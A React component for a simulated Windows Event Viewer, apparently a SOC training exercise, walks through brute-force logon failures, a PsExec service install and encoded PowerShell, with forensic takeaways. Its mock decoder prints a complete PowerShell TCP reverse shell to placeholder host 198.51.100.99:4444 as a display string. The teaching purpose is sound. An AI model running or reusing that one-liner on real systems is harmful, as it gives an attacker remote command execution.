import React, { useState } from 'react';
import { Shield, Key, Search, Terminal, AlertCircle, CheckCircle, Code } from 'lucide-react';

interface WinEvent {
  id: number;
  eventId: number;
  time: string;
  user: string;
  logonType: number;
  srcIp: string;
  status: string;
  detail: string;
}

const DEFAULT_EVENTS: WinEvent[] = [
  { id: 101, eventId: 4625, time: '14:02:11', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0xC000006A', detail: 'Failed logon attempt - Bad password (0xC000006A)' },
  { id: 102, eventId: 4625, time: '14:02:14', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0xC000006A', detail: 'Failed logon attempt - Bad password (0xC000006A)' },
  { id: 103, eventId: 4625, time: '14:02:18', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0xC000006A', detail: 'Failed logon attempt - Bad password (0xC000006A)' },
  { id: 104, eventId: 4624, time: '14:02:25', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0x0', detail: 'Successful Network Logon (Type 3) via NTLM auth to ADMIN$' },
  { id: 105, eventId: 7045, time: '14:02:38', user: 'SYSTEM', logonType: 0, srcIp: '127.0.0.1', status: '0x0', detail: 'New Service Installed: Name=PSEXESVC ImagePath=C:\\Windows\\PSEXESVC.exe Type=user mode service' },
  { id: 106, eventId: 4688, time: '14:02:40', user: 'adm_backup', logonType: 3, srcIp: '127.0.0.1', status: '0x0', detail: 'powershell.exe -NoP -NonI -W Hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==' }
];

export const WindowsEventSandbox: React.FC = () => {
  const [filterEventId, setFilterEventId] = useState<number | 'all'>('all');
  const [selectedEvent, setSelectedEvent] = useState<WinEvent>(DEFAULT_EVENTS[0]);
  const [searchQuery, setSearchQuery] = useState('');
  const [decodedCommand, setDecodedCommand] = useState<string | null>(null);

  const filteredEvents = DEFAULT_EVENTS.filter(e => {
    if (filterEventId !== 'all' && e.eventId !== filterEventId) return false;
    if (searchQuery) {
      const q = searchQuery.toLowerCase();
      return (
        e.user.toLowerCase().includes(q) ||
        e.srcIp.toLowerCase().includes(q) ||
        e.detail.toLowerCase().includes(q) ||
        e.eventId.toString().includes(q)
      );
    }
    return true;
  });

  const decodeBase64Ps = (encodedStr: string) => {
    try {
      // PowerShell Unicode base64 decoding simulation
      const base64Match = encodedStr.match(/-enc\s+([A-Za-z0-9+/=]+)/i);
      if (base64Match && base64Match[1]) {
        // Mock decoded string for realistic analyst display
        setDecodedCommand('$client = New-Object System.Net.Sockets.TCPClient("198.51.100.99", 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()');
      } else {
        setDecodedCommand('Decoded: $client = New-Object Net.Sockets.TCPClient("198.51.100.99", 4444)');
      }
    } catch {
      setDecodedCommand('Error decoding base64 payload.');
    }
  };

  return (
    <div className="bg-[#0b101b] border border-slate-800 rounded-xl overflow-hidden shadow-2xl font-sans">
      <div className="bg-[#0f172a] px-4 py-3 border-b border-slate-800 flex items-center justify-between">
        <div className="flex items-center space-x-2 text-cyan-400 font-mono text-sm font-semibold">
          <Shield className="w-4 h-4" />
          <span>Windows Event Viewer - [Security.evtx & System.evtx Console]</span>
        </div>
        <div className="flex gap-1 text-xs">
          <button
            onClick={() => setFilterEventId('all')}
            className={`px-2 py-1 rounded font-mono ${filterEventId === 'all' ? 'bg-cyan-500 text-black font-semibold' : 'bg-slate-800 text-slate-300'}`}
          >
            All
          </button>
          <button
            onClick={() => setFilterEventId(4625)}
            className={`px-2 py-1 rounded font-mono ${filterEventId === 4625 ? 'bg-red-500 text-white font-semibold' : 'bg-slate-800 text-red-400'}`}
          >
            4625 (Failed)
          </button>
          <button
            onClick={() => setFilterEventId(4624)}
            className={`px-2 py-1 rounded font-mono ${filterEventId === 4624 ? 'bg-emerald-500 text-black font-semibold' : 'bg-slate-800 text-emerald-400'}`}
          >
            4624 (Success)
          </button>
          <button
            onClick={() => setFilterEventId(7045)}
            className={`px-2 py-1 rounded font-mono ${filterEventId === 7045 ? 'bg-amber-500 text-black font-semibold' : 'bg-slate-800 text-amber-400'}`}
          >
            7045 (Service)
          </button>
          <button
            onClick={() => setFilterEventId(4688)}
            className={`px-2 py-1 rounded font-mono ${filterEventId === 4688 ? 'bg-purple-500 text-white font-semibold' : 'bg-slate-800 text-purple-400'}`}
          >
            4688 (Process)
          </button>
        </div>
      </div>

      <div className="p-3 bg-[#0a0d14] border-b border-slate-800 flex items-center gap-2">
        <Search className="w-4 h-4 text-slate-400" />
        <input
          type="text"
          value={searchQuery}
          onChange={e => setSearchQuery(e.target.value)}
          placeholder="Filter by user, source IP, or keyword (e.g. adm_backup, PSEXESVC, 0xC000006A)..."
          className="w-full bg-[#111827] text-slate-200 text-xs px-3 py-1.5 rounded border border-slate-700 focus:outline-none focus:border-cyan-500"
        />
      </div>

      {/* Event Grid */}
      <div className="max-h-56 overflow-y-auto font-mono text-xs">
        <table className="w-full text-left border-collapse">
          <thead className="bg-[#111827] text-slate-400 sticky top-0 border-b border-slate-800">
            <tr>
              <th className="py-1.5 px-3">Event ID</th>
              <th className="py-1.5 px-3">Time</th>
              <th className="py-1.5 px-3">User</th>
              <th className="py-1.5 px-3">Logon Type</th>
              <th className="py-1.5 px-3">Source IP</th>
              <th className="py-1.5 px-3">Status</th>
              <th className="py-1.5 px-3">Description</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-slate-800/40">
            {filteredEvents.map(e => {
              const isSelected = selectedEvent.id === e.id;
              const isFailed = e.eventId === 4625;
              const isService = e.eventId === 7045;
              return (
                <tr
                  key={e.id}
                  onClick={() => {
                    setSelectedEvent(e);
                    setDecodedCommand(null);
                  }}
                  className={`cursor-pointer transition-colors ${
                    isSelected
                      ? 'bg-cyan-950/80 text-cyan-200 font-semibold'
                      : isFailed
                      ? 'bg-red-950/20 text-red-300 hover:bg-red-900/30'
                      : isService
                      ? 'bg-amber-950/20 text-amber-300 hover:bg-amber-900/30'
                      : 'hover:bg-slate-800/40 text-slate-300'
                  }`}
                >
                  <td className="py-1 px-3">
                    <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
                      isFailed ? 'bg-red-500/20 text-red-400 border border-red-500/30' :
                      isService ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30' :
                      e.eventId === 4688 ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' :
                      'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                    }`}>
                      {e.eventId}
                    </span>
                  </td>
                  <td className="py-1 px-3 text-slate-400">{e.time}</td>
                  <td className="py-1 px-3">{e.user}</td>
                  <td className="py-1 px-3">
                    {e.logonType ? (
                      <span className="text-cyan-300">Type {e.logonType} {e.logonType === 3 ? '(Network)' : e.logonType === 2 ? '(Console)' : '(RDP)'}</span>
                    ) : (
                      <span className="text-slate-500">N/A</span>
                    )}
                  </td>
                  <td className="py-1 px-3">{e.srcIp}</td>
                  <td className="py-1 px-3 text-slate-400">{e.status}</td>
                  <td className="py-1 px-3 truncate max-w-xs">{e.detail}</td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>

      {/* Selected Event Detail & Decoding Workbench */}
      <div className="p-4 border-t border-slate-800 bg-[#0d131f] space-y-3">
        <div className="flex items-center justify-between border-b border-slate-800 pb-2">
          <div className="flex items-center gap-2 font-mono text-xs">
            <span className="text-cyan-400 font-bold">Event Properties - ID {selectedEvent.eventId}</span>
            <span className="text-slate-400">|</span>
            <span className="text-slate-300">Target User: {selectedEvent.user}</span>
          </div>
          {selectedEvent.eventId === 4688 && (
            <button
              onClick={() => decodeBase64Ps(selectedEvent.detail)}
              className="flex items-center gap-1.5 px-3 py-1 rounded bg-purple-600 hover:bg-purple-500 text-white font-mono text-xs font-semibold shadow-md transition-colors"
            >
              <Code className="w-3.5 h-3.5" />
              1-Click Decode Encoded PowerShell
            </button>
          )}
        </div>

        <div className="bg-[#111827] p-3 rounded-lg border border-slate-800 font-mono text-xs text-slate-300 whitespace-pre-wrap leading-relaxed">
          {selectedEvent.detail}
        </div>

        {decodedCommand && (
          <div className="p-3 rounded-lg bg-red-950/40 border border-red-500/50 space-y-1">
            <div className="flex items-center gap-1.5 text-xs font-bold text-red-400">
              <AlertCircle className="w-4 h-4" />
              De-obfuscated Adversary Payload (TCP Reverse Shell):
            </div>
            <div className="bg-[#050811] p-2.5 rounded font-mono text-[11px] text-emerald-400 overflow-x-auto">
              {decodedCommand}
            </div>
          </div>
        )}

        <div className="p-2.5 rounded-lg bg-slate-900 border border-slate-800 text-xs text-slate-300">
          <span className="text-cyan-400 font-semibold font-mono">SOC Forensic Takeaway: </span>
          {selectedEvent.eventId === 4625 ? (
            <span>Notice status code <code className="text-amber-300 font-mono">0xC000006A</code> (Bad Password). When repeated multiple times within seconds, this flags automated brute-force / password spraying.</span>
          ) : selectedEvent.eventId === 4624 && selectedEvent.logonType === 3 ? (
            <span><strong className="text-emerald-400">Logon Type 3 (Network)</strong> indicates credentials passed over the network (e.g. SMB/ADMIN$ share access). Notice the user succeeded immediately after the failed 4625 attempts!</span>
          ) : selectedEvent.eventId === 7045 ? (
            <span><strong className="text-amber-400">Event 7045 PSEXESVC.exe</strong> proves the attacker converted the successful SMB logon into arbitrary remote command execution via PsExec!</span>
          ) : (
            <span>Inspect the command-line arguments to spot LOLBAS (Living Off The Land Binaries) and stealth execution flags like <code className="text-cyan-300 font-mono">-W Hidden -NoP</code>.</span>
          )}
        </div>
      </div>
    </div>
  );
};
